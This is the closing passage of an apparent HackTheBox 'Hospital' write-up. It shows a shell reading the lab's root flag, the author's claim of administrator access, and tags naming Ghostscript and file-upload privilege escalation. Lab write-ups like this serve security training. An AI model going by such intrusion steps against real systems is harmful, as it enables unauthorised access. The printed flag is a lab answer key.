</span><span class="o">|</span><span class="w">       </span><span class="n">Downloads.lnk</span><span class="w">
</span><span class="o">|</span><span class="w">       
</span><span class="o">+-</span><span class="nt">--Music</span><span class="w">
</span><span class="o">+-</span><span class="nt">--Pictures</span><span class="w">
</span><span class="o">+-</span><span class="nt">--Saved</span><span class="w"> </span><span class="n">Games</span><span class="w">
</span><span class="o">+-</span><span class="nt">--Searches</span><span class="w">
</span><span class="n">\---Videos</span><span class="w">

</span><span class="n">C:\Users\Administrator</span><span class="err">&gt;</span><span class="nx">type</span><span class="w"> </span><span class="nx">Desktop\root.txt</span><span class="w">
</span><span class="mi">25199</span><span class="n">da887b48115d7e13fc8dc80d2e9</span><span class="w">

</span><span class="n">C:\Users\Administrator</span><span class="err">&gt;</span><span class="w">
</span></pre></table></code></div></div><p>I am Administrator Now !!</p><blockquote class="prompt-tip"><p>If you have any questions or suggestions, please leave a comment below. Thank You !</p></blockquote></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw me-1"></i> <a href="/categories/hackthebox/">HackTheBox</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw me-1"></i> <a href="/tags/privesc/" class="post-tag no-text-decoration" >PrivEsc</a> <a href="/tags/public-exploit/" class="post-tag no-text-decoration" >Public Exploit</a> <a href="/tags/ghostscript/" class="post-tag no-text-decoration" >Ghostscript</a> <a href="/tags/file-upload/" class="post-tag no-text-decoration" >File Upload</a> <a href="/tags/windows/" class="post-tag no-text-decoration" >Windows</a></div><div class=" post-tail-bottom d-flex justify-content-between align-items-center mt-5 pb-2 " ><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper d-flex align-items-center"> <span class="share-label text-muted">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hospital%20-%20StrongShiv8&url=https%3A%2F%2Fstrongshiv8.github.io%2Fposts%2FHospital%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter"> <i class="fa-fw fa-brands fa-square-x-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hospital%20-%20StrongShiv8&u=https%3A%2F%2Fstrongshiv8.github.io%2Fposts%2FHospital%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Fstrongshiv8.github.io%2Fposts%2FHospital%2F&text=Hospital%20-%20StrongShiv8" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <a href="https://www.linkedin.com/feed/?shareActive=true&shareUrl=https%3A%2F%2Fstrongshiv8.github.io%2Fposts%2FHospital%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Linkedin" aria-label="Linkedin"> <i class="fa-fw fab fa-linkedin"></i> </a> <button id="copy-link" aria-label="Copy link" class="btn small" data-bs-toggle="tooltip" data-bs-placement="top" title="Copy link" data-title-succeed="Link copied successfully!" > <i class="fa-fw fas fa-link pe-none fs-6"></i> </button> </span></div></div></div></article></main><aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 text-muted"><div class="access"><section id="access-lastmod"><h2 class="panel-heading">Recently Updated</h2><ul class="content list-unstyled ps-0 pb-1 ms-1 mt-2"><li class="text-truncate lh-lg"> <a href="/posts/Billing/">Billing</a><li class="text-truncate lh-lg"> <a href="/posts/Boxing/">Boxing</a><li class="text-truncate lh-lg"> <a href="/posts/Insomnia/">Insomnia</a><li class="text-truncate lh-lg"> <a href="/posts/Sea/">Sea</a><li class="text-truncate lh-lg"> <a href="/posts/Talk/">Talk</a></ul><div> <script src="https://tryhackme.com/badge/164383"></script></div><br><div> <a href="https://app.hackthebox.com/profile/595651"> <script src="https://www.hackthebox.eu/badge/595651"></script> </a></div></section><section><h2 class="panel-heading">Trending Tags</h2><div class="d-flex flex-wrap mt-3 mb-1 me-3"> <a class="post-tag btn btn-outline-primary" href="/tags/privesc/">PrivEsc</a> <a class="post-tag btn btn-outline-primary" href="/tags/public-exploit/">Public Exploit</a> <a class="post-tag btn btn-outline-primary" href="/tags/suids/">SUIDs</a> <a class="post-tag btn btn-outline-primary" href="/tags/cms/">CMS</a> <a class="post-tag btn btn-outline-primary" href="/tags/windows/">Windows</a> <a class="post-tag btn btn-outline-primary" href="/tags/password-bruteforce/">Password Bruteforce</a> <a class="post-tag btn btn-outline-primary" href="/tags/active-directory/">Active Directory</a> <a class="post-tag btn btn-outline-primary" href="/tags/lfi/">LFI</a> <a class="post-tag btn btn-outline-primary" href="/tags/wordpress/">Wordpress</a> <a class="post-tag btn btn-outline-primary" href="/tags/recon/">Recon</a></div></section></div><div class="toc-border-cover z-3"></div><section id="toc-wrapper" class="invisible position-sticky ps-0 pe-4 pb-4"><h2 class="panel-heading ps-3 pb-2 mb-0">Contents</h2><nav id="toc"></nav></section></aside></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4"><aside id="related-posts" aria-labelledby="related-label"><h3 class="mb-4" id="related-label">Further Reading</h3><nav class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4"><article class="col"> <a href="/posts/Hollywood/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1696876200" data-df="ll" > Oct 10, 2023 </time><h4 class="pt-0 my-2">Hollywood</h4><div class="text-muted"><p>Description ‚§µÔ∏è This is a Hollywood machine writeup/walkthrough, from PwnTillDawn platform -&amp;gt; https://online.pwntilldawn.com/ with is maintain through wizlynx group -&amp;gt; https://www.wizlynxgrou...</p></div></div></a></article><article class="col"> <a href="/posts/Craft2/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1725301800" data-df="ll" > Sep 3, 2024 </time><h4 class="pt-0 my-2">Craft2</h4><div class="text-muted"><p>Proving Ground Practice Hard Level Machine ! You gona learn about odt files, Privilege File Write, WerTrigger and Port Forwarding.</p></div></div></a></article><article class="col"> <a href="/posts/BBSCute/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1686681000" data-df="ll" > Jun 14, 2023 </time><h4 class="pt-0 my-2">BBSCute</h4><div class="text-muted"><p>Lets check the IP address of victim machine first ‚û°Ô∏è IP : 10.0.2.48 Port Scan Results ‚§µÔ∏è ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/Downloads/Proving_Ground/BBSCute] ‚îî‚îÄ$ sudo nmap -sC -sV -p- -T4 -oN Nmap_results.txt...</p></div></div></a></article></nav></aside><nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation"> <a href="/posts/Year-of-the-Fox/" class="btn btn-outline-primary" aria-label="Older" ><p>Year Of The Fox</p></a> <a href="/posts/Crafty/" class="btn btn-outline-primary" aria-label="Newer" ><p>Crafty</p></a></nav><footer aria-label="Site Info" class=" d-flex flex-column justify-content-center text-muted flex-lg-row justify-content-lg-between align-items-lg-center pb-lg-3 " ><p>¬© <time>2025</time> <a href="https://twitter.com/StrongShiv8">Shivendra Prajapati</a>. <span data-bs-toggle="tooltip" data-bs-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author." >Some rights reserved.</span></p><p>Using the <a data-bs-toggle="tooltip" data-bs-placement="top" title="v7.3.0" href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener" >Chirpy</a> theme for <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>.</p></footer></div></div><div id="search-result-wrapper" class="d-flex justify-content-center d-none"><div class="col-11 content"><div id="search-hints"><section><h2 class="panel-heading">Trending Tags</h2><div class="d-flex flex-wrap mt-3 mb-1 me-3"> <a class="post-tag btn btn-outline-primary" href="/tags/privesc/">PrivEsc</a> <a class="post-tag btn btn-outline-primary" href="/tags/public-exploit/">Public Exploit</a> <a class="post-tag btn btn-outline-primary" href="/tags/suids/">SUIDs</a> <a class="post-tag btn btn-outline-primary" href="/tags/cms/">CMS</a> <a class="post-tag btn btn-outline-primary" href="/tags/windows/">Windows</a> <a class="post-tag btn btn-outline-primary" href="/tags/password-bruteforce/">Password Bruteforce</a> <a class="post-tag btn btn-outline-primary" href="/tags/active-directory/">Active Directory</a> <a class="post-tag btn btn-outline-primary" href="/tags/lfi/">LFI</a> <a class="post-tag btn btn-outline-primary" href="/tags/wordpress/">Wordpress</a> <a class="post-tag btn btn-outline-primary" href="/tags/recon/">Recon</a></div></section></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><aside aria-label="Scroll to Top"> <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow"> <i class="fas fa-angle-up"></i> </button></aside></div><div id="mask" class="d-none position-fixed w-100 h-100 z-1"></div><aside id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-bs-animation="true" data-bs-autohide="false" ><div class="toast-header"> <button type="button" class="btn-close ms-auto" data-bs-dismiss="toast" aria-label="Close" ></button></div><div class="toast-body text-center pt-0"><p class="px-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></aside><script> (function () { const themeMapper = Theme.getThemeMapper('light', 'dark_dimmed'); const initTheme = themeMapper[Theme.visualState]; let lang = 'en';if (lang.length > 2 && !lang.startsWith('zh')) { lang = lang.slice(0, 2); } let giscusAttributes = { src: 'https://giscus.app/client.js', 'data-repo': 'StrongShiv8/strongshiv8.github.io', 'data-repo-id': 'R_kgDOJuXAnw', 'data-category': 'Comments', 'data-category-id': 'DIC_kwDOJuXAn84CeVpt', 'data-mapping': 'pathname', 'data-strict' : '0', 'data-reactions-enabled': '1', 'data-emit-metadata': '0', 'data-theme': initTheme, 'data-input-position': 'bottom', 'data-lang': lang, 'data-loading': 'lazy', crossorigin: 'anonymous', async: '' }; let giscusNode = document.createElement('script'); Object.entries(giscusAttributes).forEach(([key, value]) => giscusNode.setAttribute(key, value) ); const $footer = document.querySelector('footer'); $footer.insertAdjacentElement("beforebegin", giscusNode); addEventListener('message', (event) => { if (event.source === window && event.data && event.data.id === Theme.ID) { const newTheme = themeMapper[Theme.visualState]; const message = { setConfig: { theme: newTheme } }; const giscus = document.getElementsByClassName('giscus-frame')[0].contentWindow; giscus.postMessage({ giscus: message }, 'https://giscus.app'); } }); })(); </script> <script> document.addEventListener('DOMContentLoaded', () => { SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<article class="px-1 px-sm-2 px-lg-4 px-xl-0"><header><h2><a href="{url}">{title}</a></h2><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div></header><p>{snippet}</p></article>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); }); </script>
